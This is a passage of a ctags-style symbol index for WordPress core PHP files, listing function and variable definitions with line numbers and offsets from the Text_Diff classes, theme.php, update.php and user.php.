        $words = array();words186,4960
        $length = strlen($string);length187,4986
        $pos = 0;pos188,5021
            $spaces = strspn(substr($string, $pos), " \n");spaces192,5130
            $nextpos = strcspn(substr($string, $pos + $spaces), " \n");nextpos193,5190
    function _encode(&$string)_encode201,5444
        $string = htmlspecialchars($string);string203,5481

wordpress/wp-includes/Text/Diff/Renderer.php,2646
 * A class to render Diffs in different formats.to3,10
 * This class renders the diff in classic diff format. It is intended thatrenders5,62
 * this class be customized via inheritance, to obtain fancier outputs.be6,137
class Text_Diff_Renderer {Text_Diff_Renderer15,464
    var $_leading_context_lines = 0;_leading_context_lines23,680
    var $_leading_context_lines = 0;_leading_context_lines23,680
    var $_trailing_context_lines = 0;_trailing_context_lines31,907
    var $_trailing_context_lines = 0;_trailing_context_lines31,907
    function Text_Diff_Renderer($params = array())Text_Diff_Renderer36,982
        foreach ($params as $param => $value) {param38,1039
            $v = '_' . $param;v39,1087
    function getParams()getParams51,1342
        $params = array();params53,1373
        foreach (get_object_vars($this) as $k => $v) {k54,1400
    function render($diff)render70,1737
        $xi = $yi = 1;xi72,1770
        $block = false;block73,1793
        $context = array();context74,1817
        $nlead = $this->_leading_context_lines;nlead76,1846
        $ntrail = $this->_trailing_context_lines;ntrail77,1894
        $output = $this->_startDiff();output79,1945
        $diffs = $diff->getDiff();diffs81,1985
        foreach ($diffs as $i => $edit) {i82,2020
                    $keep = $i == count($diffs) - 1 ? $ntrail : $nlead + $ntrail;keep91,2488
                            $context = array_slice($edit->orig, 0, $ntrail);context100,3014
                        $block = false;block107,3434
                $context = $edit->orig;context111,3591
                    $context = array_slice($context, count($context) - $nlead);context116,3829
                    $x0 = $xi - count($context);x0117,3909
                    $y0 = $yi - count($context);y0118,3958
                    $block = array();block119,4007
    function _block($xbeg, $xlen, $ybeg, $ylen, &$edits)_block144,4674
        $output = $this->_startBlock($this->_blockHeader($xbeg, $xlen, $ybeg, $ylen));output146,4737
    function _startDiff()_startDiff171,5481
    function _endDiff()_endDiff176,5539
    function _blockHeader($xbeg, $xlen, $ybeg, $ylen)_blockHeader181,5595
    function _startBlock($header)_startBlock200,6056
    function _endBlock()_endBlock205,6134
    function _lines($lines, $prefix = ' ')_lines210,6191
    function _lines($lines, $prefix = ' ')prefix210,6191
    function _context($lines)_context215,6309
    function _added($lines)_added220,6396
    function _deleted($lines)_deleted225,6481
    function _changed($orig, $final)_changed230,6568

wordpress/wp-includes/Text/Diff.php,4302
class Text_Diff {Text_Diff18,631
    var $_edits;_edits25,716
    function Text_Diff($engine, $params)Text_Diff36,1167
            $params = array($engine, $params);params40,1295
            $engine = 'auto';engine41,1342
            $engine = extension_loaded('xdiff') ? 'xdiff' : 'native';engine45,1416
            $engine = basename($engine);engine47,1503
        $class = 'Text_Diff_Engine_' . $engine;class52,1650
        $diff_engine = new $class();diff_engine53,1698
        $this->_edits = call_user_func_array(array($diff_engine, 'diff'), $params);_edits55,1736
    function getDiff()getDiff61,1884
    function countAddedLines()countAddedLines73,2121
        $count = 0;count75,2158
    function countDeletedLines()countDeletedLines92,2604
        $count = 0;count94,2643
     * $diff = new Text_Diff($lines1, $lines2);diff109,2988
     * $rev = $diff->reverse();rev110,3036
    function reverse()reverse118,3362
            $rev = clone($this);rev121,3448
            $rev = $this;rev123,3498
    function isEmpty()isEmpty137,3812
    function lcs()lcs154,4211
        $lcs = 0;lcs156,4236
    function getOriginal()getOriginal172,4648
        $lines = array();lines174,4681
    function getFinal()getFinal190,5093
        $lines = array();lines192,5123
    function trimNewlines(&$line, $key)trimNewlines208,5596
        $line = str_replace(array("\n", "\r"), '', $line);line210,5642
    function _getTempDir()_getTempDir223,5989
        $tmp_locations = array('/tmp', '/var/tmp', 'c:\WUTemp', 'c:\temp',tmp_locations225,6022
        $tmp = ini_get('upload_tmp_dir');tmp229,6216
            $tmp = getenv('TMPDIR');tmp233,6363
            $tmp_check = array_shift($tmp_locations);tmp_check239,6582
                $tmp = $tmp_check;tmp241,6675
    function _check($from_lines, $to_lines)_check255,7016
        $rev = $this->reverse();rev264,7387
        $prevtype = null;prevtype272,7729
            $prevtype = get_class($edit);prevtype277,7938
class Text_MappedDiff extends Text_Diff {Text_MappedDiff289,8106
    function Text_MappedDiff($from_lines, $to_lines,Text_MappedDiff307,9006
        $xi = $yi = 0;xi315,9325
            $orig = &$this->_edits[$i]->orig;orig317,9404
                $orig = array_slice($from_lines, $xi, count($orig));orig319,9485
            $final = &$this->_edits[$i]->final;final323,9606
                $final = array_slice($to_lines, $yi, count($final));final325,9690
class Text_Diff_Op {Text_Diff_Op339,9937
    var $orig;orig341,9959
    var $final;final342,9974
    function &reverse()reverse344,9991
    function norig()norig349,10084
    function nfinal()nfinal354,10171
class Text_Diff_Op_copy extends Text_Diff_Op {Text_Diff_Op_copy367,10370
    function Text_Diff_Op_copy($orig, $final = false)Text_Diff_Op_copy369,10418
    function Text_Diff_Op_copy($orig, $final = false)final369,10418
            $final = $orig;final372,10511
        $this->orig = $orig;orig374,10549
        $this->final = $final;final375,10578
    function &reverse()reverse378,10616
        $reverse = &new Text_Diff_Op_copy($this->final, $this->orig);reverse380,10646
class Text_Diff_Op_delete extends Text_Diff_Op {Text_Diff_Op_delete392,10857
    function Text_Diff_Op_delete($lines)Text_Diff_Op_delete394,10907
        $this->orig = $lines;orig396,10954
        $this->final = false;final397,10984
    function &reverse()reverse400,11021
        $reverse = &new Text_Diff_Op_add($this->orig);reverse402,11051
class Text_Diff_Op_add extends Text_Diff_Op {Text_Diff_Op_add414,11247
    function Text_Diff_Op_add($lines)Text_Diff_Op_add416,11294
        $this->final = $lines;final418,11338
        $this->orig = false;orig419,11369
    function &reverse()reverse422,11405
        $reverse = &new Text_Diff_Op_delete($this->final);reverse424,11435
class Text_Diff_Op_change extends Text_Diff_Op {Text_Diff_Op_change436,11635
    function Text_Diff_Op_change($orig, $final)Text_Diff_Op_change438,11685
        $this->orig = $orig;orig440,11739
        $this->final = $final;final441,11768
    function &reverse()reverse444,11806
        $reverse = &new Text_Diff_Op_change($this->final, $this->orig);reverse446,11836

wordpress/wp-includes/theme-compat/comments-popup.php,205
$commenter = wp_get_current_commenter();commenter43,1584
$comments = get_approved_comments($id);comments45,1646
$post = get_post($id);post46,1686
document.onkeypress = function esc(e) {esc122,5075

wordpress/wp-includes/theme-compat/comments.php,0

wordpress/wp-includes/theme-compat/footer.php,0

wordpress/wp-includes/theme-compat/header.php,0

wordpress/wp-includes/theme-compat/sidebar.php,0

wordpress/wp-includes/theme.php,19605
 * Despite advances over get_themes(), this function is quite expensive, and growsis12,178
function wp_get_themes( $args = array() ) {wp_get_themes27,1103
function wp_get_themes( $args = array() ) {args27,1103
	$defaults = array( 'errors' => false, 'allowed' => null, 'blog_id' => 0 );defaults30,1179
	$args = wp_parse_args( $args, $defaults );args31,1255
	$theme_directories = search_theme_directories();theme_directories33,1300
		$current_theme = get_stylesheet();current_theme38,1571
			$root_of_current_theme = get_raw_theme_root( $current_theme );root_of_current_theme40,1665
				$root_of_current_theme = WP_CONTENT_DIR . $root_of_current_theme;root_of_current_theme42,1801
		$allowed = $args['allowed'];allowed51,2068
			$theme_directories = array_intersect_key( $theme_directories, WP_Theme::get_allowed_on_network() );theme_directories53,2131
			$theme_directories = array_intersect_key( $theme_directories, WP_Theme::get_allowed_on_site( $args['blog_id'] ) );theme_directories55,2267
			$theme_directories = array_intersect_key( $theme_directories, WP_Theme::get_allowed( $args['blog_id'] ) );theme_directories57,2407
			$theme_directories = array_diff_key( $theme_directories, WP_Theme::get_allowed( $args['blog_id'] ) );theme_directories59,2524
	$themes = array();themes62,2633
	static $_themes = array();_themes63,2653
	static $_themes = array();_themes63,2653
	foreach ( $theme_directories as $theme => $theme_root ) {theme65,2682
		foreach ( $themes as $theme => $wp_theme ) {theme73,3064
function wp_get_theme( $stylesheet = null, $theme_root = null ) {wp_get_theme92,3722
function wp_get_theme( $stylesheet = null, $theme_root = null ) {stylesheet92,3722
		$stylesheet = get_stylesheet();stylesheet96,3849
		$theme_root = get_raw_theme_root( $stylesheet );theme_root99,3915
			$theme_root = WP_CONTENT_DIR . '/themes';theme_root101,3997
			$theme_root = WP_CONTENT_DIR . $theme_root;theme_root103,4112
function is_child_theme() {is_child_theme116,4349
function get_stylesheet() {get_stylesheet134,4814
function get_stylesheet_directory() {get_stylesheet_directory146,5147
	$stylesheet = get_stylesheet();stylesheet147,5185
	$theme_root = get_theme_root( $stylesheet );theme_root148,5218
	$stylesheet_dir = "$theme_root/$stylesheet";stylesheet_dir149,5264
function get_stylesheet_directory_uri() {get_stylesheet_directory_uri161,5492
	$stylesheet = get_stylesheet();stylesheet162,5534
	$theme_root_uri = get_theme_root_uri( $stylesheet );theme_root_uri163,5567
	$stylesheet_dir_uri = "$theme_root_uri/$stylesheet";stylesheet_dir_uri164,5621
function get_stylesheet_uri() {get_stylesheet_uri180,6124
	$stylesheet_dir_uri = get_stylesheet_directory_uri();stylesheet_dir_uri181,6156
	$stylesheet_uri = $stylesheet_dir_uri . '/style.css';stylesheet_uri182,6211
function get_locale_stylesheet_uri() {get_locale_stylesheet_uri205,7223
	$stylesheet_dir_uri = get_stylesheet_directory_uri();stylesheet_dir_uri207,7282
	$dir = get_stylesheet_directory();dir208,7337
	$locale = get_locale();locale209,7373
		$stylesheet_uri = "$stylesheet_dir_uri/$locale.css";stylesheet_uri211,7438
		$stylesheet_uri = "$stylesheet_dir_uri/{$wp_locale->text_direction}.css";stylesheet_uri213,7596
		$stylesheet_uri = '';stylesheet_uri215,7678
function get_template() {get_template227,7962
function get_template_directory() {get_template_directory239,8265
	$template = get_template();template240,8301
	$theme_root = get_theme_root( $template );theme_root241,8330
	$template_dir = "$theme_root/$template";template_dir242,8374
function get_template_directory_uri() {get_template_directory_uri255,8724
	$template = get_template();template256,8764
	$theme_root_uri = get_theme_root_uri( $template );theme_root_uri257,8793
	$template_dir_uri = "$theme_root_uri/$template";template_dir_uri258,8845
function get_theme_roots() {get_theme_roots270,9186
	$theme_roots = get_site_transient( 'theme_roots' );theme_roots276,9310
		$theme_roots = get_site_transient( 'theme_roots' );theme_roots279,9461
function register_theme_directory( $directory ) {register_theme_directory292,9747
		$directory = WP_CONTENT_DIR . '/' . $directory;directory297,9953
function search_theme_directories( $force = false ) {search_theme_directories316,10414
function search_theme_directories( $force = false ) {force316,10414
	static $found_themes;found_themes321,10555
	$found_themes = array();found_themes325,10646
	$wp_theme_directories = (array) $wp_theme_directories;wp_theme_directories327,10673
	if ( $cache_expiration = apply_filters( 'wp_cache_themes_persistently', false, 'search_theme_directories' ) ) {cache_expiration339,11163
		$cached_roots = get_site_transient( 'theme_roots' );cached_roots340,11276
			foreach ( $cached_roots as $theme_dir => $theme_root ) {theme_dir342,11368
			$cache_expiration = 1800; // half hourcache_expiration354,11823
		$cache_expiration = 1800; // half hourcache_expiration356,11875
		$dirs = @ scandir( $theme_root );dirs363,12113
			if ( ! is_dir( $theme_root . '/' . $dir ) || $dir[0] == '.' || $dir == 'CVS' )dir367,12213
				$found_theme = false;found_theme377,12610
				$sub_dirs = @ scandir( $theme_root . '/' . $dir );sub_dirs380,12777
					if ( ! is_dir( $theme_root . '/' . $dir . '/' . $sub_dir ) || $dir[0] == '.' || $dir == 'CVS' )dir384,12914
					$found_theme = true;found_theme392,13289
	$theme_roots = array();theme_roots407,13625
	$relative_theme_roots = array_flip( $relative_theme_roots );relative_theme_roots408,13650
	foreach ( $found_themes as $theme_dir => $theme_data ) {theme_dir410,13713
function get_theme_root( $stylesheet_or_template = false ) {get_theme_root431,14330
function get_theme_root( $stylesheet_or_template = false ) {stylesheet_or_template431,14330
	if ( $stylesheet_or_template && $theme_root = get_raw_theme_root( $stylesheet_or_template ) ) {theme_root434,14423
			$theme_root = WP_CONTENT_DIR . $theme_root;theme_root438,14766
		$theme_root = WP_CONTENT_DIR . '/themes';theme_root440,14823
function get_theme_root_uri( $stylesheet_or_template = false, $theme_root = false ) {get_theme_root_uri459,15354
function get_theme_root_uri( $stylesheet_or_template = false, $theme_root = false ) {stylesheet_or_template459,15354
		$theme_root = get_raw_theme_root( $stylesheet_or_template );theme_root463,15521
				$theme_root_uri = content_url( str_replace( WP_CONTENT_DIR, '', $theme_root ) );theme_root_uri469,15834
				$theme_root_uri = site_url( str_replace( ABSPATH, '', $theme_root ) );theme_root_uri471,15970
				$theme_root_uri = plugins_url( basename( $theme_root ), $theme_root );theme_root_uri473,16150
				$theme_root_uri = $theme_root;theme_root_uri475,16233
			$theme_root_uri = content_url( $theme_root );theme_root_uri477,16279
		$theme_root_uri = content_url( 'themes' );theme_root_uri480,16342
function get_raw_theme_root( $stylesheet_or_template, $skip_cache = false ) {get_raw_theme_root495,16842
function get_raw_theme_root( $stylesheet_or_template, $skip_cache = false ) {skip_cache495,16842
	$theme_root = false;theme_root501,17015
			$theme_root = get_option('stylesheet_root');theme_root506,17224
			$theme_root = get_option('template_root');theme_root508,17335
		$theme_roots = get_theme_roots();theme_roots512,17414
			$theme_root = $theme_roots[$stylesheet_or_template];theme_root514,17505
function locale_stylesheet() {locale_stylesheet525,17662
	$stylesheet = get_locale_stylesheet_uri();stylesheet526,17693
function preview_theme() {preview_theme540,18043
 * Private function to modify the current template when previewing a themeto573,18998
function _preview_theme_template_filter() {_preview_theme_template_filter580,19136
 * Private function to modify the current stylesheet when previewing a themeto585,19246
function _preview_theme_stylesheet_filter() {_preview_theme_stylesheet_filter592,19386
 * Callback function for ob_start() to capture all links in the theme.for597,19502
function preview_theme_ob_filter( $content ) {preview_theme_ob_filter605,19662
 * Callback function for preg_replace_callback() to accept and filter matches.for612,19917
function preview_theme_ob_filter_callback( $matches ) {preview_theme_ob_filter_callback620,20084
	$link = add_query_arg( array( 'preview' => 1, 'template' => $_GET['template'], 'stylesheet' => @$_GET['stylesheet'], 'preview_iframe' => 1 ), $matches[3] );link634,20746
		$link = "?$link";link636,20945
function switch_theme( $template, $stylesheet ) {switch_theme649,21277
	$old_theme  = wp_get_theme();old_theme655,21512
	$new_theme = wp_get_theme( $stylesheet );new_theme656,21543
	$new_name  = $new_theme->get('Name');new_name657,21586
		$default_theme_mods = (array) get_option( 'mods_' . $new_name );default_theme_mods670,22039
function validate_current_theme() {validate_current_theme691,22704
function get_theme_mods() {get_theme_mods721,23526
	$theme_slug = get_option( 'stylesheet' );theme_slug722,23554
	if ( false === ( $mods = get_option( "theme_mods_$theme_slug" ) ) ) {mods723,23597
		$theme_name = get_option( 'current_theme' );theme_name724,23668
			$theme_name = wp_get_theme()->get('Name');theme_name726,23746
		$mods = get_option( "mods_$theme_name" ); // Deprecated location.mods727,23792
 * through {@link http://php.net/sprintf sprintf()} PHP function with the firstwith740,24163
function get_theme_mod( $name, $default = false ) {get_theme_mod751,24528
function get_theme_mod( $name, $default = false ) {default751,24528
	$mods = get_theme_mods();mods752,24580
		$default = sprintf( $default, get_template_directory_uri(), get_stylesheet_directory_uri() );default758,24732
function set_theme_mod( $name, $value ) {set_theme_mod771,25072
	$mods = get_theme_mods();mods772,25114
	$theme = get_option( 'stylesheet' );theme776,25169
function remove_theme_mod( $name ) {remove_theme_mod791,25506
	$mods = get_theme_mods();mods792,25543
	$theme = get_option( 'stylesheet' );theme802,25697
function remove_theme_mods() {remove_theme_mods811,25867
	$theme_name = get_option( 'current_theme' );theme_name815,25976
		$theme_name = wp_get_theme()->get('Name');theme_name817,26052
function get_header_textcolor() {get_header_textcolor828,26231
function header_textcolor() {header_textcolor837,26440
function display_header_text() {display_header_text848,26588
	$text_color = get_theme_mod( 'header_textcolor', get_theme_support( 'custom-header', 'default-text-color' ) );text_color852,26705
function get_header_image() {get_header_image863,26944
	$url = get_theme_mod( 'header_image', get_theme_support( 'custom-header', 'default-image' ) );url864,26974
		$url = get_random_header_image();url870,27153
		$url = str_replace( 'http://', 'https://', $url );url873,27207
		$url = str_replace( 'https://', 'http://', $url );url875,27266
function _get_random_header_data() {_get_random_header_data890,27509
	static $_wp_random_header;_wp_random_header891,27546
		$header_image_mod = get_theme_mod( 'header_image', '' );header_image_mod895,27644
		$headers = array();headers896,27703
			$headers = get_uploaded_header_images();headers899,27780
				$headers = $_wp_default_headers;headers902,27927
					$headers = $_wp_default_headers;headers905,28047
		$_wp_random_header = (object) $headers[ array_rand( $headers ) ];_wp_random_header912,28147
function get_random_header_image() {get_random_header_image928,28658
	$random_image = _get_random_header_data();random_image929,28695
function is_random_header_image( $type = 'any' ) {is_random_header_image947,29218
function is_random_header_image( $type = 'any' ) {type947,29218
	$header_image_mod = get_theme_mod( 'header_image', get_theme_support( 'custom-header', 'default-image' ) );header_image_mod948,29269
function header_image() {header_image968,29859
function get_uploaded_header_images() {get_uploaded_header_images979,30018
	$header_images = array();header_images980,30058
	$headers = get_posts( array( 'post_type' => 'attachment', 'meta_key' => '_wp_attachment_is_custom_header', 'meta_value' => get_option('stylesheet'), 'orderby' => 'none', 'nopaging' => true ) );headers983,30104
		$url = esc_url_raw( $header->guid );url989,30388
		$header_data = wp_get_attachment_metadata( $header->ID );header_data990,30427
		$header_index = basename($url);header_index991,30487
function get_custom_header() {get_custom_header1010,30978
	$data = is_random_header_image()? _get_random_header_data() : get_theme_mod( 'header_image_data' );data1011,31009
	$default = array(default1012,31110
function register_default_headers( $headers ) {register_default_headers1028,31641
	$_wp_default_headers = array_merge( (array) $_wp_default_headers, (array) $headers );_wp_default_headers1031,31720
 * This function must be called after register_default_headers() has already added themust1037,31848
function unregister_default_headers( $header ) {unregister_default_headers1046,32171
function get_background_image() {get_background_image1065,32582
function background_image() {background_image1074,32783
function get_background_color() {get_background_color1085,32941
function background_color() {background_color1094,33143
function _custom_background_cb() {_custom_background_cb1104,33293
	$background = get_background_image();background1106,33393
	$color = get_theme_mod( 'background_color' );color1110,33548
	$style = $color ? "background-color: #$color;" : '';style1115,33641
		$image = " background-image: url('$background');";image1118,33718
		$repeat = get_theme_mod( 'background_repeat', 'repeat' );repeat1120,33772
			$repeat = 'repeat';repeat1122,33919
		$repeat = " background-repeat: $repeat;";repeat1123,33942
		$position = get_theme_mod( 'background_position_x', 'left' );position1125,33987
			$position = 'left';position1127,34120
		$position = " background-position: top $position;";position1128,34143
		$attachment = get_theme_mod( 'background_attachment', 'scroll' );attachment1130,34198
			$attachment = 'scroll';attachment1132,34329
		$attachment = " background-attachment: $attachment;";attachment1133,34356
 * This function automatically adds another stylesheet with -rtl prefix, e.g. editor-style-rtl.css.automatically1151,34852
 * It is a better option to use that class and add any RTL styles to the main stylesheet.and1157,35212
function add_editor_style( $stylesheet = 'editor-style.css' ) {add_editor_style1164,35459
function add_editor_style( $stylesheet = 'editor-style.css' ) {stylesheet1164,35459
	$editor_styles = (array) $editor_styles;editor_styles1172,35619
	$stylesheet    = (array) $stylesheet;stylesheet1173,35661
		$rtl_stylesheet = str_replace('.css', '-rtl.css', $stylesheet[0]);rtl_stylesheet1175,35719
	$editor_styles = array_merge( $editor_styles, $stylesheet );editor_styles1179,35827
function remove_editor_styles() {remove_editor_styles1189,36043
function add_theme_support( $feature ) {add_theme_support1208,36573
		$args = true;args1212,36673
		$args = array_slice( func_get_args(), 1 );args1214,36695
				$args = array( 0 => array() );args1228,37088
			$defaults = array(defaults1230,37124
			$jit = isset( $args[0]['__jit'] );jit1245,37484
				define( 'NO_HEADER_TEXT', empty( $args[0]['header-text'] ) );NO_HEADER_TEXT1267,38604
				define( 'HEADER_IMAGE_WIDTH', (int) $args[0]['width'] );HEADER_IMAGE_WIDTH1272,38804
				define( 'HEADER_IMAGE_HEIGHT', (int) $args[0]['height'] );HEADER_IMAGE_HEIGHT1277,39003
				define( 'HEADER_TEXTCOLOR', $args[0]['default-text-color'] );HEADER_TEXTCOLOR1282,39216
				define( 'HEADER_IMAGE', $args[0]['default-image'] );HEADER_IMAGE1287,39414
				$args = array( 0 => array() );args1305,40000
			$defaults = array(defaults1307,40036
			$jit = isset( $args[0]['__jit'] );jit1315,40239
				define( 'BACKGROUND_COLOR', $args[0]['default-color'] );BACKGROUND_COLOR1328,40767
				define( 'BACKGROUND_IMAGE', $args[0]['default-image'] );BACKGROUND_IMAGE1333,40976
function _custom_header_background_just_in_time() {_custom_header_background_just_in_time1347,41208
		$args = get_theme_support( 'custom-header' );args1354,41519
			$custom_image_header = new Custom_Image_Header( $args[0]['admin-head-callback'], $args[0]['admin-preview-callback'] );custom_image_header1360,41745
		$args = get_theme_support( 'custom-background' );args1368,42089
			$custom_background = new Custom_Background( $args[0]['admin-head-callback'], $args[0]['admin-preview-callback'] );custom_background1373,42284
function get_theme_support( $feature ) {get_theme_support1386,42672
	$args = array_slice( func_get_args(), 1 );args1394,42882
function remove_theme_support( $feature ) {remove_theme_support1419,43587
function _remove_theme_support( $feature ) {_remove_theme_support1433,43961
			$support = get_theme_support( 'custom-header' );support1449,44430
			$support = get_theme_support( 'custom-background' );support1457,44758
function current_theme_supports( $feature ) {current_theme_supports1475,45223
	$args = array_slice( func_get_args(), 1 );args1488,45578
			$content_type = $args[0];content_type1497,45958
			$post_format = $args[0];post_format1504,46196
			$header_support = $args[0];header_support1512,46482
function require_if_theme_supports( $feature, $include) {require_if_theme_supports1527,47025
function _delete_attachment_theme_mod( $id ) {_delete_attachment_theme_mod1542,47419
	$attachment_image = wp_get_attachment_url( $id );attachment_image1543,47466
	$header_image = get_header_image();header_image1544,47517
	$background_image = get_background_image();background_image1545,47554
	if ( $header_image && $header_image == $attachment_image )header_image1547,47600
	if ( $background_image && $background_image == $attachment_image )background_image1550,47699
function check_theme_switched() {check_theme_switched1561,48000
	if ( $stylesheet = get_option( 'theme_switched' ) ) {stylesheet1562,48034
		$old_theme = wp_get_theme( $stylesheet );old_theme1563,48089
function _wp_customize_include() {_wp_customize_include1581,48500
function _wp_customize_loader_settings() {_wp_customize_loader_settings1598,48993
	$admin_origin = parse_url( admin_url() );admin_origin1601,49058
	$home_origin  = parse_url( home_url() );home_origin1602,49101
	$cross_domain = ( strtolower( $admin_origin[ 'host' ] ) != strtolower( $home_origin[ 'host' ] ) );cross_domain1603,49143
	$browser = array(browser1605,49244
	$settings = array(settings1610,49395
	$script = 'var _wpCustomizeLoaderSettings = ' . json_encode( $settings ) . ';';script1616,49549
	$data = $wp_scripts->get_data( 'customize-loader', 'data' );data1618,49631
		$script = "$data\n$script";script1620,49707
function wp_customize_url( $stylesheet = null ) {wp_customize_url1634,50099
function wp_customize_url( $stylesheet = null ) {stylesheet1634,50099
	$url = admin_url( 'customize.php' );url1635,50149
 * This function MUST be called inside the body tag.MUST1646,50450
 * Ideally, call this function immediately after the body tag is opened.immediately1648,50506
function wp_customize_support_script() {wp_customize_support_script1656,50754
	$admin_origin = parse_url( admin_url() );admin_origin1657,50795
	$home_origin  = parse_url( home_url() );home_origin1658,50838
	$cross_domain = ( strtolower( $admin_origin[ 'host' ] ) != strtolower( $home_origin[ 'host' ] ) );cross_domain1659,50880

wordpress/wp-includes/update.php,5165
function wp_version_check() {wp_version_check22,578
	$php_version = phpversion();php_version28,766
	$current = get_site_transient( 'update_core' );current30,797
		$current = new stdClass;current32,878
	$timeout = 60;timeout38,1043
	$time_not_changed = isset( $current->last_checked ) && $timeout > ( time() - $current->last_checked );time_not_changed39,1059
	$locale = apply_filters( 'core_version_check_locale', get_locale() );locale43,1206
		$mysql_version = preg_replace('/[^0-9.].*/', '', $wpdb->db_version());mysql_version50,1497
		$mysql_version = 'N/A';mysql_version52,1576
		$user_count = get_user_count( );user_count55,1629
		$num_blogs = get_blog_count( );num_blogs56,1664
		$wp_install = network_site_url( );wp_install57,1698
		$multisite_enabled = 1;multisite_enabled58,1735
		$user_count = count_users( );user_count60,1771
		$user_count = $user_count['total_users'];user_count61,1803
		$multisite_enabled = 0;multisite_enabled62,1847
		$num_blogs = 1;num_blogs63,1873
		$wp_install = home_url( '/' );wp_install64,1891
	$query = array(query67,1928
	$url = 'http://api.wordpress.org/core/version-check/1.6/?' . http_build_query( $query, null, '&' );url78,2299
	$options = array(options80,2401
	$response = wp_remote_get($url, $options);response89,2655
	$body = trim( wp_remote_retrieve_body( $response ) );body94,2806
	$body = maybe_unserialize( $body );body95,2861
	$offers = $body['offers'];offers100,2974
		foreach ( $offer as $offer_key => $value ) {offer_key103,3037
		$offer = (object) array_intersect_key( $offer, array_fill_keys( array( 'response', 'download', 'locale',offer112,3447
	$updates = new stdClass();updates116,3660
function wp_update_plugins() {wp_update_plugins136,4342
	$plugins = get_plugins();plugins146,4684
	$active  = get_option( 'active_plugins', array() );active147,4711
	$current = get_site_transient( 'update_plugins' );current148,4764
		$current = new stdClass;current150,4846
	$new_option = new stdClass;new_option152,4874
			$timeout = 60; // 1 mintimeout158,5073
			$timeout = 3600; // 1 hourtimeout162,5165
			$timeout = 43200; // 12 hourstimeout165,5217
	$time_not_changed = isset( $current->last_checked ) && $timeout > ( time() - $current->last_checked );time_not_changed168,5254
		$plugin_changed = false;plugin_changed171,5387
		foreach ( $plugins as $file => $p ) {file172,5414
				$plugin_changed = true;plugin_changed176,5616
			foreach ( $current->response as $plugin_file => $update_details ) {plugin_file180,5723
					$plugin_changed = true;plugin_changed182,5841
	$to_send = (object) compact('plugins', 'active');to_send197,6186
	$options = array(options199,6238
	$raw_response = wp_remote_post('http://api.wordpress.org/plugins/update-check/1.0/', $options);raw_response205,6463
	$response = maybe_unserialize( wp_remote_retrieve_body( $raw_response ) );response210,6675
function wp_update_themes() {wp_update_themes233,7361
	$installed_themes = wp_get_themes();installed_themes239,7524
	$last_update = get_site_transient( 'update_themes' );last_update240,7562
		$last_update = new stdClass;last_update242,7651
	$themes = array();themes244,7683
	$checked = array();checked245,7703
			$timeout = 60; // 1 mintimeout267,8421
			$timeout = 3600; // 1 hourtimeout271,8512
			$timeout = 43200; // 12 hourstimeout274,8564
	$time_not_changed = isset( $last_update->last_checked ) && $timeout > ( time( ) - $last_update->last_checked );time_not_changed277,8601
		$theme_changed = false;theme_changed280,8743
		foreach ( $checked as $slug => $v ) {slug281,8769
				$theme_changed = true;theme_changed285,8961
			foreach ( $last_update->response as $slug => $update_details ) {slug289,9075
					$theme_changed = true;theme_changed291,9183
	$options = array(options306,9533
	$raw_response = wp_remote_post( 'http://api.wordpress.org/themes/update-check/1.0/', $options );raw_response312,9758
	$new_update = new stdClass;new_update317,9971
	$response = maybe_unserialize( wp_remote_retrieve_body( $raw_response ) );response321,10073
function wp_get_update_data() {wp_get_update_data335,10374
	$counts = array( 'plugins' => 0, 'themes' => 0, 'wordpress' => 0 );counts336,10406
		$update_plugins = get_site_transient( 'update_plugins' );update_plugins339,10523
		$update_themes = get_site_transient( 'update_themes' );update_themes345,10739
		$update_wordpress = get_core_updates( array('dismissed' => false) );update_wordpress351,10989
	$update_title = array();update_title357,11329
	$update_title = ! empty( $update_title ) ? esc_attr( implode( ', ', $update_title ) ) : '';update_title365,11740
function _maybe_update_core() {_maybe_update_core370,11901
	$current = get_site_transient( 'update_core' );current373,12014
function _maybe_update_plugins() {_maybe_update_plugins393,12561
	$current = get_site_transient( 'update_plugins' );current394,12596
function _maybe_update_themes( ) {_maybe_update_themes409,12991
	$current = get_site_transient( 'update_themes' );current410,13026
function wp_schedule_update_checks() {wp_schedule_update_checks422,13278

wordpress/wp-includes/user.php,19811
 * The various authentication cookies will be set by this function and will beand15,307
function wp_signon( $credentials = '', $secure_cookie = '' ) {wp_signon25,709
function wp_signon( $credentials = '', $secure_cookie = '' ) {credentials25,709
		$secure_cookie = is_ssl();secure_cookie44,1372
	$secure_cookie = apply_filters('secure_signon_cookie', $secure_cookie, $credentials);secure_cookie46,1402
	$auth_secure_cookie = $secure_cookie;auth_secure_cookie49,1575
	$user = wp_authenticate($credentials['user_login'], $credentials['user_password']);user53,1678
			$user = new WP_Error('', '');user57,1874
function wp_authenticate_username_password($user, $username, $password) {wp_authenticate_username_password72,2212
		$error = new WP_Error();error76,2383
	$userdata = get_user_by('login', $username);userdata87,2674
			$details = get_blog_details( $userdata->primary_blog );details99,3252
	$userdata = apply_filters('wp_authenticate_user', $userdata, $password);userdata105,3440
	$user =  new WP_User($userdata->ID);user113,3918
function wp_authenticate_cookie($user, $username, $password) {wp_authenticate_cookie120,4040
		$user_id = wp_validate_auth_cookie();user_id124,4200
			$auth_cookie = SECURE_AUTH_COOKIE;auth_cookie131,4352
			$auth_cookie = AUTH_COOKIE;auth_cookie133,4397
function count_user_posts($userid) {count_user_posts153,4806
	$where = get_posts_by_author_sql('post', true, $userid);where156,4859
	$count = $wpdb->get_var( "SELECT COUNT(*) FROM $wpdb->posts $where" );count158,4918
function count_many_users_posts( $users, $post_type = 'post' ) {count_many_users_posts172,5311
function count_many_users_posts( $users, $post_type = 'post' ) {post_type172,5311
	$count = array();count175,5392
	$userlist = implode( ',', array_map( 'absint', $users ) );userlist179,5477
	$where = get_posts_by_author_sql( $post_type );where180,5537
	$result = $wpdb->get_results( "SELECT post_author, COUNT(*) FROM $wpdb->posts $where AND post_author IN ($userlist) GROUP BY post_author", ARRAY_N );result182,5587
function user_pass_ok($user_login, $user_pass) {user_pass_ok205,6224
	$user = wp_authenticate($user_login, $user_pass);user206,6273
function get_current_user_id() {get_current_user_id226,6542
	$user = wp_get_current_user();user227,6575
function get_user_option( $option, $user = 0, $deprecated = '' ) {get_user_option251,7485
function get_user_option( $option, $user = 0, $deprecated = '' ) {user251,7485
		$user = wp_get_current_user();user258,7669
		$user = new WP_User( $user );user260,7708
		$result = $user->get( $wpdb->prefix . $option );result266,7852
		$result = $user->get( $option );result268,7974
		$result = false;result270,8015
function update_user_option( $user_id, $option_name, $newvalue, $global = false ) {update_user_option293,8787
function update_user_option( $user_id, $option_name, $newvalue, $global = false ) {global293,8787
